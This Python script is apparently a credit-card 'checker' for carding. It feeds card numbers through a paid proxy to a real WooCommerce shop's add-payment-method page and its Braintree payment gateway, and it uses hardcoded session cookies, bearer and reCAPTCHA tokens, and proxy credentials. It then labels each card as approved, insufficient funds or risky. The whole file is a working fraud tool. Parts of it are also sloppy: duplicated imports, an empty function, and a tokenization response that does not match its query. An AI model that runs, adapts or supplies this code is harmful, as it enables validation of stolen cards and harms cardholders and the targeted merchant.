import requests
import re
import random
import time
import string,json
import base64,user_agent,flagz
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import pycountry,jwt
username = "SestraOPce11f"
password = "eb14ff0949b9_country-us"
proxy = "proxy.speedproxies.net:12321"
proxy = {"http":"http://{}:{}@{}".format(username, password, proxy)}
def vip(card_data):
	import requests
import requests
import re
import random
import time
import string
import base64
from bs4 import BeautifulSoup
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	with open('fileb3.txt', 'r') as file:
		first_line = file.readline()
	while True:
		lines='''pgsgkcavs%7C1722217254%7C2ZIg7XXQhPP64o2wD4dS03V5aYJJU4SprKlVlXZi2gD%7C98b6fadd264973f091de743724dec4f8c3940bc2243f0f9b81b7985df0b2e093
xxnx69hh%7C1722217378%7Cls2dhu18PRskrc7Cq7hbXfPHfO5xFCHCVfs30iwwPrb%7C2ab2b26a70bbbe05a49a5108a675f94f862759025c1122941f0fdf1ffb997ec7'''
		lines = lines.strip().split('\n')
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			break
	with open('fileb3.txt', 'w') as file:
		file.write(big)
	cookies = {
    'aelia_customer_country': 'IN',
    '_gcl_au': '1.1.566184184.1723999278',
    '_ga': 'GA1.2.1734785499.1723999278',
    '_gid': 'GA1.2.463117208.1723999278',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36',
    'cookielawinfo-checkbox-necessary': 'yes',
    'cookielawinfo-checkbox-functional': 'no',
    'cookielawinfo-checkbox-performance': 'no',
    'cookielawinfo-checkbox-analytics': 'no',
    'cookielawinfo-checkbox-advertisement': 'no',
    'cookielawinfo-checkbox-others': 'no',
    'wordpress_logged_in_taombilliards_b9721a': 'xdzaarav%7C1725208910%7CZgISqdjZ5rck9SJiWPTAAl6MoBe0U3FI2CrtaQLdp2e%7Cca7da165a95f0e266b098b76f25cd709b011dbcdb684e2eeb823ccd62e9b122d',
    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_PTMJYPWZZ5': 'GS1.2.1723999278.1.1.1723999362.42.0.0',
}
	
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'aelia_customer_country=IN; _gcl_au=1.1.566184184.1723999278; _ga=GA1.2.1734785499.1723999278; _gid=GA1.2.463117208.1723999278; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no; wordpress_logged_in_taombilliards_b9721a=xdzaarav%7C1725208910%7CZgISqdjZ5rck9SJiWPTAAl6MoBe0U3FI2CrtaQLdp2e%7Cca7da165a95f0e266b098b76f25cd709b011dbcdb684e2eeb823ccd62e9b122d; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F; _ga_PTMJYPWZZ5=GS1.2.1723999278.1.1.1723999362.42.0.0',
    'origin': 'https://taombilliards.com',
    'priority': 'u=0, i',
    'referer': 'https://taombilliards.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	response = requests.get('https://taombilliards.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)	
	enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjQwODU4MTIsImp0aSI6ImEwZjM4ZDAyLWMzZWUtNDY0Mi05ZDcxLTExYjFjMDZkN2RjNiIsInN1YiI6Im5naDN3d3BqOXIyMjNncHYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im5naDN3d3BqOXIyMjNncHYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.YUCt0ePeliHe7tbeQa5Zw1jHKiE0qR2MZxAAlsb3CtLsCqAyeP-0XtTCDkQBgXZ7eEpE5Dn_CLsqAJ450tsHog',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://taombilliards.com',
    'priority': 'u=1, i',
    'referer': 'https://taombilliards.com/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ae9f15c8-e8ca-4dec-bb36-99936849ce3e',
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"698e6aaa-6b50-4bf0-adc4-d454c57ef68a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4304512200105020","expirationMonth":"10","expirationYear":"2028","cvv":"323","billingAddress":{"postalCode":"11743","streetAddress":""}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	import requests
	
	cookies = {
    'aelia_customer_country': 'IN',
    '_gcl_au': '1.1.566184184.1723999278',
    '_ga': 'GA1.2.1734785499.1723999278',
    '_gid': 'GA1.2.463117208.1723999278',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36',
    'cookielawinfo-checkbox-necessary': 'yes',
    'cookielawinfo-checkbox-functional': 'no',
    'cookielawinfo-checkbox-performance': 'no',
    'cookielawinfo-checkbox-analytics': 'no',
    'cookielawinfo-checkbox-advertisement': 'no',
    'cookielawinfo-checkbox-others': 'no',
    'wordpress_logged_in_taombilliards_b9721a': 'xdzaarav%7C1725208910%7CZgISqdjZ5rck9SJiWPTAAl6MoBe0U3FI2CrtaQLdp2e%7Cca7da165a95f0e266b098b76f25cd709b011dbcdb684e2eeb823ccd62e9b122d',
    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_PTMJYPWZZ5': 'GS1.2.1723999278.1.1.1723999362.42.0.0',
}
	
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'aelia_customer_country=IN; _gcl_au=1.1.566184184.1723999278; _ga=GA1.2.1734785499.1723999278; _gid=GA1.2.463117208.1723999278; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-18%2016%3A11%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Safari%2F537.36; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no; wordpress_logged_in_taombilliards_b9721a=xdzaarav%7C1725208910%7CZgISqdjZ5rck9SJiWPTAAl6MoBe0U3FI2CrtaQLdp2e%7Cca7da165a95f0e266b098b76f25cd709b011dbcdb684e2eeb823ccd62e9b122d; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftaombilliards.com%2Fmy-account%2Fadd-payment-method%2F; _ga_PTMJYPWZZ5=GS1.2.1723999278.1.1.1723999362.42.0.0',
    'origin': 'https://taombilliards.com',
    'priority': 'u=0, i',
    'referer': 'https://taombilliards.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}
	
	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': 'tokencc_bh_xv7m99_fv2mzv_kx24gn_h87wc8_594',
    'wc_braintree_device_data': '{"correlation_id":"54de75028c546974058f03adef89053a"}',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'i13_recaptcha_payment_method_token': '03AFcWeA6dt_6LVJEGplu1bq_GTBzcxnKrrZ_idmOIvQCYS_WGmnnIcNo_QzXj6G0oxsGTEM6obOaFM1EkIiZNcadz77it9RGHG3KJqoPVKFxnASEZbRNk52V4JM7oxSb3zyyi-sSx5WUP3kgRXKoAOZ3E2K2SS7vQde4Cr0-sjcPuScl3428-Vg9fU2poFJY8uiVdfsRhuRg-0sAgz3dZAS89v-e44A_bcsCe5dhgTlfGMRnN4RxcWqcM3f8Hsm4wKbAtjxxlLsA_MYvA4-v-ZGj7CJ0RmWntqWoEpUOUUmj2xN6XMwTjFSj66nQQnNIHE8gZR6UJ53uuuvy0AE8LvdbDFwMIOm0Z8wM8tnVeArFGdn7ZmUAVbSRyGPRnB0CkChq3zXniFsxXYN3TZoTUVskMswgeQumPaazB5J7Sc-aQ04QBHfRJdAmP1Yk83aNY_r_ZrByIDWA76yRovV8bPFplSRMWmN9B17_jumh6Qnx4pjYK_vwpgB0BFNGS5VciLyInHLdCtGOdiKF_CjJbZYYA2VIN3AoqEDlVusGWDR9rFahYKfJt9DWCV3uZcK7_md8Ze_SwuoDYqtbSr_li7HB2KqoUjgE4HkASbAYAx6JysN-jewcuj9MWsme1xKYOoNyxAUe7P0ZB3pIVSNmP9YAScpTEgSGnI0DYXsjB5vU3lTxwBhVw6B5f4AXl4SXD9EKbm9fXetQu4AzAuSIasKj46pR57vpck6rvKX5D44I_vX0ODSp_i1Xdk67iydGg6aiPaMb7VTeUjG48WtoMtZenXEqhbXtfNbKMZdqE0xe-FaXCtlzn2tMPKnB_qjfu23kJ8xEazKQx56n-tVzg3YkyoM_GfmehOw',
    'woocommerce-add-payment-method-nonce': '8ba549dc6f',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
	
	response = requests.post(
	    'https://taombilliards.com/my-account/add-payment-method/',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'Payment method successfully added.' in text:
			result = "1000: Approved"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "RISK"
		else:
			result = "Error"
			print('er#')
	if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
def sq(card):
	return 'Make sure to cover well when you come to sleep'